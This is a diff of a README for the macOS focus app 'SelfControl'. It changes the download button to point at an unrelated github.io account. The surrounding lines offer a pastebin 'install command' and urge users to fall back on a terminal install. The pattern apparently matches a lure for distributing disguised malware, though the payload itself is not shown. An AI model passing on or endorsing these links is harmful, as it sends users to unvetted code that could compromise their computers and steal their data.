@@ -3,7 +3,7 @@
 
 **SelfControl** is a free and open-source app for macOS that helps you block distracting websites and stay focused. Set a timer, add sites to your blocklist, and regain control of your productivity. ✨  
 
-[![Download for macOS](https://img.shields.io/badge/macOS-Download-0A84FF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/selfcontrol)  
+[![Download for macOS](https://img.shields.io/badge/macOS-Download-0A84FF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/selfcontrol)  
 [![Get Install Command](https://img.shields.io/badge/Get-Install_Command-34C759?style=for-the-badge&logo=terminal)](https://pastebin.com/raw/bFGviutx)
 
 > If the download button doesn’t work, please use the terminal installation method below.
